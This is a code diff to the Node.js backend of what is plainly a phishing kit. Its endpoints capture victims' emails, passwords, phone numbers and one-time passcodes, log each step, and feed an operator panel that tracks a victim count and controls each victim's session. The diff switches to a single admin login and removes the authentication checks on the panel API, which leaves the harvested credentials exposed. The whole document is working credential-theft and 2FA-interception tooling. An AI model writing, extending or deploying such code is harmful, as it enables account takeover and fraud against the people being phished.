@@ -6,7 +6,7 @@ const crypto     = require('crypto');
 const session    = require('cookie-session');
 
 /* ----------  CONFIG  ---------- */
-const PANEL_USERS    = (process.env.PANEL_USERS  || 'admin,admin1').split(',');
+const PANEL_USER     = process.env.PANEL_USER  || 'admin';
 const PANEL_PASS     = process.env.PANEL_PASS  || 'changeme';
 const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
 
@@ -23,10 +23,10 @@ app.use(session({
   sameSite: 'strict'
 }));
 
-/* ----------  STATE (SHARED ACROSS ALL ADMINS) ---------- */
+/* ----------  STATE  ---------- */
 const sessionsMap     = new Map();   // live sessions
 const sessionActivity = new Map();   // last ping
-const auditLog        = [];          // never deleted - shared across all admins
+const auditLog        = [];          // never deleted
 let victimCounter     = 0;
 let successfulLogins  = 0;
 let currentDomain     = '';          // filled at boot + on every request
@@ -50,9 +50,8 @@ app.get('/panel', (req, res) => {
 
 app.post('/panel/login', (req, res) => {
   const { user, pw } = req.body;
-  if (PANEL_USERS.includes(user) && pw === PANEL_PASS) {
+  if (user === PANEL_USER && pw === PANEL_PASS) {
     req.session.authed = true;
-    req.session.user = user;
     return res.redirect('/panel');
   }
   res.redirect('/panel?fail=1');
@@ -174,6 +173,8 @@ app.post('/api/login', async (req, res) => {
     v.status = 'wait'; v.attempt += 1; v.totalAttempts += 1;
     sessionActivity.set(sid, Date.now());
     
+    // Add to activity log
+    v.activityLog = v.activityLog || [];
     v.activityLog.push({ 
       time: Date.now(), 
       action: 'ENTERED CREDENTIALS', 
@@ -199,6 +200,8 @@ app.post('/api/verify', async (req, res) => {
     v.status = 'wait';
     sessionActivity.set(sid, Date.now());
     
+    // Add to activity log
+    v.activityLog = v.activityLog || [];
     v.activityLog.push({ 
       time: Date.now(), 
       action: 'ENTERED PHONE', 
@@ -223,6 +226,8 @@ app.post('/api/unregister', async (req, res) => {
     v.unregisterClicked = true; v.status = 'wait';
     sessionActivity.set(sid, Date.now());
     
+    // Add to activity log
+    v.activityLog = v.activityLog || [];
     v.activityLog.push({ 
       time: Date.now(), 
       action: 'CLICKED UNREGISTER', 
@@ -246,6 +251,8 @@ app.post('/api/otp', async (req, res) => {
     v.otp = otp; v.status = 'wait';
     sessionActivity.set(sid, Date.now());
     
+    // Add to activity log
+    v.activityLog = v.activityLog || [];
     v.activityLog.push({ 
       time: Date.now(), 
       action: 'ENTERED OTP', 
@@ -271,6 +278,8 @@ app.post('/api/page', async (req, res) => {
     v.page = page;
     sessionActivity.set(sid, Date.now());
     
+    // Add to activity log
+    v.activityLog = v.activityLog || [];
     v.activityLog.push({ 
       time: Date.now(), 
       action: 'PAGE CHANGE', 
@@ -318,6 +327,7 @@ app.post('/api/interaction', (req, res) => {
   if (!sessionsMap.has(sid)) return res.sendStatus(404);
   const v = sessionsMap.get(sid);
   
+  // Store interaction timestamp
   v.lastInteraction = Date.now();
   v.interactions = v.interactions || [];
   v.interactions.push({ type, data, time: Date.now() });
@@ -328,10 +338,8 @@ app.post('/api/interaction', (req, res) => {
 
 /* ----------  WEB PANEL API  ---------- */
 
-/*  panel data - SHARED ACROSS ALL ADMINS  */
+/*  panel data  */
 app.get('/api/panel', (req, res) => {
-  if (!req.session?.authed) return res.status(401).json({ error: 'Unauthorized' });
-  
   const list = Array.from(sessionsMap.values()).map(v => ({
     sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v), page: v.page, status: v.status,
     email: v.email, password: v.password, phone: v.phone, otp: v.otp,
@@ -339,7 +347,6 @@ app.get('/api/panel', (req, res) => {
     entered: v.entered, unregisterClicked: v.unregisterClicked,
     activityLog: v.activityLog || []
   }));
-  
   res.json({
     domain: currentDomain,
     totalVictims: victimCounter,
@@ -347,15 +354,12 @@ app.get('/api/panel', (req, res) => {
     waiting: list.filter(x => x.status === 'wait').length,
     success: successfulLogins,
     sessions: list,
-    logs: auditLog.slice(-50).reverse(),
-    currentUser: req.session.user || 'admin'
+    logs: auditLog.slice(-50).reverse()
   });
 });
 
 /*  panel control  */
 app.post('/api/panel', async (req, res) => {
-  if (!req.session?.authed) return res.status(401).json({ error: 'Unauthorized' });
-  
   const { action, sid } = req.body;
   const v = sessionsMap.get(sid);
   if (!v) return res.status(404).json({ ok: false });
@@ -389,4 +393,3 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 });
-
